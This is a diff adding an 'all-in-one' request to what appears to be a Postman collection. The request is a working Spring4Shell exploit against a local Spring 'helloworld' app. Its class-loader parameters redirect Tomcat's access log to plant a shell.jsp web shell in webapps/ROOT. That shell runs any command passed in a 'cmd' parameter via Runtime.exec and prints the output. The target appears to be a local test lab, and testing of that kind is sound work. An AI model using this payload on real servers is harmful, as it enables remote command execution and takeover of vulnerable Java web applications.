@@ -188,6 +188,72 @@
 				}
 			},
 			"response": []
+		},
+		{
+			"name": "all-in-one",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "prefix",
+						"value": "<%",
+						"type": "text"
+					},
+					{
+						"key": "suffix",
+						"value": "%>//",
+						"type": "text"
+					},
+					{
+						"key": "c",
+						"value": "Runtime",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.pattern",
+							"value": "%{prefix}i java.io.InputStream in = %{c}i.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %{suffix}i",
+							"type": "default"
+						},
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.suffix",
+							"value": ".jsp",
+							"type": "default"
+						},
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.directory",
+							"value": "webapps/ROOT",
+							"type": "default"
+						},
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.prefix",
+							"value": "shell",
+							"type": "default"
+						},
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat",
+							"value": "",
+							"type": "default"
+						}
+					]
+				},
+				"url": {
+					"raw": "http://localhost:8080/helloworld/greeting",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"helloworld",
+						"greeting"
+					]
+				}
+			},
+			"response": []
 		}
 	]
 }
